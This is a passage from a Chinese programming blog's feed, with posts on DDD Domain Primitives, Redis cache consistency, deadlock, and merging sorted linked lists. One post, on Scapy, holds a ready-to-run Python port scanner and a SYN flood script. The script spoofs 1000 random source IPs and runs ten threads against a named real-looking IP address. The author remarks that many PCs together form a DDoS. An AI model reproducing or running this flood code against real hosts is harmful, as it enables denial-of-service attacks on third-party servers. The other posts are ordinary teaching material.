title="接口语义与参数校验"></a>接口语义与参数校验</h3><p>User类有两个参数：一个username，一个phone，都是String类型，当这个代码被编译以后，方法只会去保留参数类型而没有参数名，假如这个代码被其他的程序员去调用，其他人并不了解内部逻辑，很有可能会颠倒参数顺序</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403165944297.png" class><p>这种情况在编译期间无法被检测。</p><p>假如未来系统支持通过用户名和身份证号码去进行注册，身份证号是String，这个时候register就会被改造为两个方法：registerByPhone和registerByIdCard两个方法。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403170258821.png" class><p>假如以后又会有新的变化，我们如何去让接口有足够明确的无歧义、可拓展性呢？最好带有一定的自检性</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403170452214.png" class><p>首先看这里的对参数值进行校验，这里的参数校验会有很多的参数校验代码，一旦一部分参数修改就需要全部去修改，这很不符合开闭原则。有什么优化方法？</p><ol><li>封装一个工具类</li></ol><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403170722553.png" class><p>改造成上面的样子，这样会去解决一部分问题，但是还不算是一种最佳实践，因为它还存在两个缺点，第一：业务内部还是需要去主动调用工具类去进行校验，假如有一天用户名不再需要校验，那还是要去修改原来的代码。第二：一旦参数类型越来越多，那工具类的校验逻辑会不断地膨胀，后续很难去维护。</p><h4 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h4><ol><li>接口语义不够明确，很容易发生问题，可拓展性不强</li><li>参数校验逻辑复用，高内聚</li><li>参数校验和业务逻辑异常解耦。</li></ol><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>语义可拓展性是因为多个属性都是String类型，会发生混淆，可拓展性不强是因为使用了基本参数类型和参数个数写死了。</p><p>首先，用户的个人属性必不可少，那我们是否可以将对于属性的校验逻辑封装到一个自定义类型种呢？这样接口只会接收到通过校验的参数，这很合理，还有一个好处，就是自然而然将参数校验与业务逻辑分开。</p><p>我们可以去创建一个PhoneNumber类，在构建这个类的时候我们去自动执行校验逻辑，这样就能确保被构建出来的对象一定是合法的</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403172434729.png" class><p>这样就不再需要业务方法内部去对参数进行校验，而且将不同类型的逻辑聚合到了属性自身，不再分散于工具类种进行管理，此外，方法的签名中因为使用了自定义类型，不仅语义更加清晰，而且在编译期间就会进行强类型校验，避免传参乱序这种低级错误</p><p>经过改造的代码如图所示：</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403172913892.png" class><p>我们可以看到：接口的语义更加清晰，拥有一定的可拓展性，对于参数的校验也更加内聚。除此之外核心业务逻辑</p><h3 id="核心业务逻辑的清晰度"><a href="#核心业务逻辑的清晰度" class="headerlink" title="核心业务逻辑的清晰度"></a>核心业务逻辑的清晰度</h3><p>经过改造的代码更加优雅，但是它是否真的“纯粹”？</p><p>registerationService用于对用户进行注册的服务，那它的定义应该是仅仅用于注册。</p><p>什么是注册？</p><p>注册就是拿到用户信息进行存储，这样就能让业务逻辑简单易读。</p><p>而这段代码的两个行为，一个是“获取手机号归属地编码”，一个是“获取运营商编码”</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403173339531.png" class><p>把这个放在注册的业务领域显然不合适，什么逻辑应该归属于哪个业务域，这就是对于“领域”的理解。不同的理解角度会产生不同的领域模型划分，那“获取手机号归属地编码”&amp;“获取运营商编码”不属于注册领域，那我们为什么要在register方法里写这个逻辑？仅仅是为了给findRep方法去准备参数？这就像是拿胶水逻辑进行缝缝补补，那如何去改善胶水逻辑呢？</p><ol><li>改造接口的入参</li></ol><p>假如方法的入参类型为phoneNumber，也就是直接通过手机号就能查到运营商编号，那就不哟用操作了</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403174425749.png" class><ol start="2"><li>不能修改传参类型</li></ol><p>“获取手机号归属地编码”&amp;“获取运营商编码”这两个行为都是获取手机号相关的属性，应该内聚于手机号这个类型中，这在抽象上也是合理的。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403174819064.png" class><p>如图，我们把“获取手机号归属地编码”&amp;“获取运营商编码”放在了PhoneNumber类中。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403174912049.png" class><p>此时原先的注册业务就会十分简单。</p><h3 id="测试单元可行性"><a href="#测试单元可行性" class="headerlink" title="测试单元可行性"></a>测试单元可行性</h3><p>通过上述方法，我们不同于以往的测试，往往一个业务需求的改变牵一发而动全身，现在可以实实在在的减少测试成本，而且测试成本越来越小。</p><p>在传统的POJO中，类中只包含getter、setter方法，而这里的PhoneNumber却包含初始化、校验、属性处理等多种逻辑，这就是DD与传统MVC开发最重要的差异点，像我们上面提到的PhoneNumber不仅拥有属性，而且包含了与其属性的相关职责，这就属于<strong>充血模型</strong>，而传统的POJO就属于<strong>贫血模型</strong>。而如何去把握充血的强弱程度，这就需要很丰富的经验了。</p><p><strong>DP(Domain Primitive)</strong></p><p>在DDD里，DP可以说是一切模型、方法、架构的基础。它是在特定领域、拥有精准定义、可以自我验证、拥有行为的对象。可可以认为是领域的最小组成部分。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;DDD入门五板斧（一）Domain Primitive&lt;/p&gt;
&lt;p&gt;DDD即Domain-Driven Design，领域驱动设计是现在一种很火的设计思想。&lt;/p&gt;
&lt;p&gt; 什么是领域？&lt;/p&gt;
&lt;p&gt;暂且理解为“业务问题的范畴”&lt;/p&gt;
&lt;p&gt;领域可大可小，对应着大小业</summary>
      
    
    
    
    <category term="DDD" scheme="http://example.com/categories/DDD/"/>
    
    
    <category term="DDD" scheme="http://example.com/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>Redis与数据库数据一致性</title>
    <link href="http://example.com/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/"/>
    <id>http://example.com/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/</id>
    <published>2022-03-28T14:36:23.000Z</published>
    <updated>2022-04-03T14:56:32.977Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，redis作为一种缓存位于应用与数据库中间，用来实现应用和数据库的读操作的缓存层，主要目的就是为了减少数据库的IO</p><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403223914229.png" class><p>当用户去查询数据的时候，如果命中缓存，那就直接返回，如果没有命中就从数据库查询，查到数据以后，再去把数据缓存到redis。</p><p>此时我们假设我们要去更新redis和MySQL，而更新操作是有先后顺序的，它不像MySQL中事务的原子性，所以数据很有可能出现短暂的不一致</p><h3 id="先更新数据库后更新缓存"><a href="#先更新数据库后更新缓存" class="headerlink" title="先更新数据库后更新缓存"></a>先更新数据库后更新缓存</h3><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403224317813.png" class><p>此时如果缓存更新失败，就会导致数据库和redis的数据发生不一致，</p><h3 id="先删除缓存后更新数据库"><a href="#先删除缓存后更新数据库" class="headerlink" title="先删除缓存后更新数据库"></a>先删除缓存后更新数据库</h3><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403224433006.png" class><p>当下次访问redis的时候，此时如果发现redis数据为空，那就会从MySQL中加载并且保存到redis，也就是说数据库理论上是一致的，但是毕竟事件存在一点点时差，难免造成数据不一致的问题</p><h3 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h3><h4 id="基于RocketMQ的消息可靠性通信"><a href="#基于RocketMQ的消息可靠性通信" class="headerlink" title="基于RocketMQ的消息可靠性通信"></a>基于RocketMQ的消息可靠性通信</h4><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403224802430.png" class><p>先更新数据库的数据，然后去修改redis数据，如果此时删除失败，可以用消息中间件去传递消息，知道修改成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们知道，redis作为一种缓存位于应用与数据库中间，用来实现应用和数据库的读操作的缓存层，主要目的就是为了减少数据库的IO&lt;/p&gt;
&lt;img src=&quot;/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%</summary>
      
    
    
    
    <category term="Redis" scheme="http://example.com/categories/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>死锁</title>
    <link href="http://example.com/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/"/>
    <id>http://example.com/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/</id>
    <published>2022-03-24T14:47:55.000Z</published>
    <updated>2022-03-24T15:44:21.907Z</updated>
    
    <content type="html"><![CDATA[<h3 id="死锁与饥饿"><a href="#死锁与饥饿" class="headerlink" title="死锁与饥饿"></a>死锁与饥饿</h3><img src="/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/image-20220324234351318.png" class><p>死锁：各个进程相互等待对方手里的资源，导致各个进程都阻塞，无法向前继续推进的现象。</p><p>饥饿：若长期得不到想要的资源，某进程无法向前推进的现象。</p><p>死锁的进程是处于阻塞态的，多个进程都无法运行了，而饥饿是还在运行，只是有一个进程一直得不到处理</p><h3 id="死锁的四个条件"><a href="#死锁的四个条件" class="headerlink" title="死锁的四个条件"></a>死锁的四个条件</h3><ul><li>不剥夺条件</li></ul><p>进程所获得的资源在未使用完之前，不能由其他进程强行夺走，只能主动释放</p><ul><li>请求和保持条件</li></ul><p>进程以及至少占用了一个资源，但是又提出了新的资源请求，而该资源又被其他的进程占有，又对于自身的资源保持不放</p><ul><li>循环等待</li></ul><p>若干个进程资源存在循环等待链，链条中每个进程都被下一个进程请求</p><p>现在假设一个场景，两个小孩都想尝一下两个苹果，但是它们一次只能拿着一个苹果吃一口，现在A吃完了自己手上的苹果，然后B吃完了自己手上的苹果，现在A想去拿B的苹果，B又想去拿A的苹果，但是两个小孩都很不懂事，它们都不行自己先去放下自己手中的苹果，那双方就会一直这样僵持下去。这就是死锁</p><h2 id="死锁的处理"><a href="#死锁的处理" class="headerlink" title="死锁的处理"></a>死锁的处理</h2><h3 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h3><p>对于死锁形成的四个必要条件，那就会有四种不同的破坏策略</p><ul><li>互斥条件</li></ul><p>只有互斥的资源的争抢才会形成死锁，因为资源只能被一个进程享受。可以看看释放能将资源改为共享的，比如把苹果放在桌子上，两个小孩都可以去同时咬。</p><ul><li>不剥夺条件</li></ul><p>当进程得不到想要的资源的时候可以去考虑释放自己的资源，然后尝试去再次获取</p><p>但是这样容易前功尽弃，以前好不容易申请的资源又释放了</p><ul><li>请求和保持</li></ul><p>进程在运行前先去得到他所需要的全部资源这样就不会去争抢资源了，但是这是很难去实现的</p><ul><li>循环等待</li></ul><p>可采用顺序资源分配法，首先给系统资源编号，每个进程去按顺序请求资源，这样就不会循环等待了，但是这个时候如果又新增的进程，这就会很不方便</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;死锁与饥饿&quot;&gt;&lt;a href=&quot;#死锁与饥饿&quot; class=&quot;headerlink&quot; title=&quot;死锁与饥饿&quot;&gt;&lt;/a&gt;死锁与饥饿&lt;/h3&gt;&lt;img src=&quot;/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E</summary>
      
    
    
    
    <category term="操作系统" scheme="http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>浅试Scapy</title>
    <link href="http://example.com/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/"/>
    <id>http://example.com/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/</id>
    <published>2022-03-24T13:44:34.000Z</published>
    <updated>2022-03-24T14:09:51.776Z</updated>
    
    <content type="html"><![CDATA[<p>在我的计算机网络分类里很早之前就有一篇关于计算机网络的文章，那里只是对于计算机网络的常见攻击手段进行了简单讲解，今天我利用scapy模拟了一下scapy的SYN洪水攻击。</p><p>对于SYN洪水不了解的可以看我以前的<a href="https://andersonlee09.github.io/2022/02/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E9%89%B4%E8%B5%8F/#SYN%E6%B4%AA%E6%B0%B4">文章</a></p><p>我们知道一般的网站都是部署在Linux服务器上的，所以在攻击目标网址之前先要知道目标的IP以及暴露端口</p><img src="/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/image-20220324215916212.png" class><p>利用windows或者Linux自带的ping命令就可以获取对方IP，但是怎么知道目标暴露端口？</p><ul><li>通过抓包软件</li></ul><p>通过wireshark抓包软件抓取数据包，然后通过数据包来分析对方IP暴露情况，这里不进行讲解，关于wireshark的使用可以看我以前的文章</p><ul><li>通过scapy</li></ul><p>scapy是一个非常强大的python第三方库，它提供了构造、解析以及发送和接收数据包的功能，而我们可以对于目标IP的不同端口发送TCP包，如果能在一定时间收到IP就说明该端口暴露，否则不暴露</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, TCP<br><br><span class="hljs-comment"># 清除提示</span><br>conf.verb = <span class="hljs-number">0</span><br><span class="hljs-comment"># the port of ip u want to search</span><br>ip = <span class="hljs-string">&quot;121.43.175.217&quot;</span><br><span class="hljs-comment"># lis = [2250, 3246, 5001, 6432]</span><br><span class="hljs-keyword">for</span> dst_port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>):<br>    pkt = IP(dst=ip) / TCP(dport=dst_port)<br>    ans = sr(pkt, timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># print(ans)</span><br>    <span class="hljs-comment"># print(type(ans))</span><br>    <span class="hljs-comment"># print(ans[0])</span><br>    <span class="hljs-comment"># print(type(ans[0]))</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(ans[<span class="hljs-number">0</span>]):<br>        <span class="hljs-built_in">print</span>(dst_port)<br></code></pre></td></tr></table></figure><p>可以看到代码其实非常简单，遍历不同的对方端口，然后是否能收到的数据包是否正常就可以了</p><p>接下来我们讲解攻击的过程</p><p>首先我在这里模拟了1000个IP用于伪造自己的IP，然后利用自己电脑的不同端口向目标IP端口发起攻击，开启了10个线程同时进行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scapy<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, ICMP, TCP<br><span class="hljs-keyword">from</span> scapy.sendrecv <span class="hljs-keyword">import</span> send, sr1, sr, srp1<br><span class="hljs-keyword">from</span> scapy.utils <span class="hljs-keyword">import</span> rdpcap<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-comment"># 攻击的IP</span><br>dst = <span class="hljs-string">&quot;121.43.175.217&quot;</span><br><span class="hljs-comment"># 目标端口</span><br>dst_port = <span class="hljs-number">6342</span><br><span class="hljs-comment"># 随机生成1000个IP</span><br>num = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>))<br>my_ip = [<span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(<br>    random.choice(num)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]<br><span class="hljs-built_in">print</span>(my_ip)<br><span class="hljs-comment"># pkt = IP(src=dst) / TCP()  # 要发生的包</span><br><span class="hljs-comment"># print(pkt.show())</span><br><span class="hljs-comment"># res = sr1(pkt)  # send receive 1  这里收到 1个包</span><br><span class="hljs-comment"># res = sr()  # send and receive  这里收到 所有 包</span><br><span class="hljs-comment"># res = send()  # 只发不收</span><br><span class="hljs-comment"># res = srp1()  # 只发送两层  不发送传输层</span><br><span class="hljs-comment"># print(res.summary())</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">synFlood</span>():<br>    <span class="hljs-keyword">for</span> src_ort <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>, <span class="hljs-number">65535</span>):<br>        ipLayer = IP(src=random.choice(my_ip), dst=dst)<br>        tcpLayer = TCP(sport=src_ort, dport=dst_port, flags=<span class="hljs-string">&quot;S&quot;</span>)<br>        pkt = ipLayer / tcpLayer<br>        send(pkt)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        threading.Thread(target=synFlood).start()<br></code></pre></td></tr></table></figure><p>因为个人PC能造成的杀伤实在有限，可能难以造成肉眼可见的效果，但是当PC多了以后就能形成Ddos攻击，这里只是分享一种实现方法~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我的计算机网络分类里很早之前就有一篇关于计算机网络的文章，那里只是对于计算机网络的常见攻击手段进行了简单讲解，今天我利用scapy模拟了一下scapy的SYN洪水攻击。&lt;/p&gt;
&lt;p&gt;对于SYN洪水不了解的可以看我以前的&lt;a href=&quot;https://andersonl</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>CodingInterview25合并两个排序链表</title>
    <link href="http://example.com/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/"/>
    <id>http://example.com/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</id>
    <published>2022-03-21T15:42:49.000Z</published>
    <updated>2022-03-22T02:38:08.201Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为在准备东西的时候发现自己还有很多不足，一直在学习操作系统的有关东西，加上也在熟悉公司业务，算法也有在做，但是写算法的题解耗时非常久，因为要写分析和画图，今天分享一道常规的链表题目：<a href="https://leetcode-cn.com/problems/he-bing-liang-ge-pai-xu-de-lian-biao-lcof/">剑指 Offer 25. 合并两个排序的链表</a>，一周以后关于操作系统的相关东西我差不多就整理完毕了，到时候我会专心写题解的</p><p>这道题我们乍一看脑袋里肯定会有一定的思想的，比如以前在学习mergeSort的时候我们经常会去合并两个有序数，而合并数组和链表其实是很相似的</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220321235226968.png" class><h3 id="迭代法"><a href="#迭代法" class="headerlink" title="迭代法"></a>迭代法</h3><p>这就是对两个链表依次处理就可以了</p><p>如图，我们想合并l1&amp;l2两个链表，首先我们肯定是从前到后，把比较小的元素一次放入另一个链表里面</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220321235546578.png" class><p>我们做链表类的题目第一件事一定要先去想是否需要去创建一个dummyhead（假头），dummyhead在链表类题目是十分常用的，因为在处理第一个元素的时候十分麻烦，<strong>为什么？</strong></p><p>比如有时候两个链表都为空的时候那合成的第三个链表一定为空，那返回的时候我们就要去判断如果头为空怎样，如果不为空又怎样</p><p>而如果有了dummyhead以后就会直接返回dummyhead.next</p><p>言归正传，我们用一个node节点刚开始去指向dummyhead节点如图</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220322000241509.png" class><p>每次去挑选原来的两个链表的最小节点</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220322000420601.png" class><p>如图此时1最小，我们就把1放在node后面，然后让node&#x3D;node.next</p><p>等到两个链表有一个链表（假设为链表1）元素全部放完以后，直接让node.next&#x3D;链表2剩下的所有节点</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * public class ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode next;</span><br><span class="hljs-comment"> *     ListNode(int x) &#123; val = x; &#125;</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> ListNode <span class="hljs-title function_">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> &#123;<br>        <span class="hljs-type">ListNode</span> <span class="hljs-variable">dummyHead</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>(-<span class="hljs-number">1</span>);<br>        <span class="hljs-type">ListNode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> dummyHead;<br>        <span class="hljs-keyword">while</span> (l1 != <span class="hljs-literal">null</span> &amp;&amp; l2 != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (l1.val &lt;= l2.val) &#123;<br>                node.next = l1;<br>                l1 = l1.next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                node.next = l2;<br>                l2 = l2.next;<br>            &#125;<br>            node = node.next;<br>        &#125;<br>        node.next = l1 == <span class="hljs-literal">null</span> ? l2 : l1;<br>        <span class="hljs-keyword">return</span> dummyHead.next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上为解题过程，不加讲解了</p><h3 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h3><p>递推方法我们往往要去确定两个点：</p><ol><li>如何分解问题</li><li>递归何时停止</li></ol><p>看过上一个方法我们很清楚的知道：当链表有一个一旦元素全部被放完，那另一个链表的剩下所有节点就会放到链表尾部，这就是停止条件了</p><p>关于如何分解，我们可以让链表去一个一个元素去处理，直到达到终止条件</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220322001654228.png" class><p>大概就是这样的思想</p><p>终止条件：当两个链表都为空时，表示我们对链表已合并完成。<br>如何递归：我们判断 l1 和 l2 头结点哪个更小，然后较小结点的 next 指针指向其余结点的合并结果。（调用递归）</p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * public class ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode next;</span><br><span class="hljs-comment"> *     ListNode(int x) &#123; val = x; &#125;</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> ListNode <span class="hljs-title function_">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> &#123;<br>        <span class="hljs-keyword">if</span> (l1 == <span class="hljs-literal">null</span> || l2 == <span class="hljs-literal">null</span>) <span class="hljs-type">return</span> <span class="hljs-variable">l1</span> <span class="hljs-operator">=</span>= <span class="hljs-literal">null</span> ? l2 : l1;<br>        <span class="hljs-keyword">if</span> (l1.val &lt;= l2.val) &#123;<br>            l1.next = mergeTwoLists(l1.next, l2);<br>            <span class="hljs-keyword">return</span> l1;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            l2.next = mergeTwoLists(l1, l2.next);<br>            <span class="hljs-keyword">return</span> l2;<br>        &#125;<br>    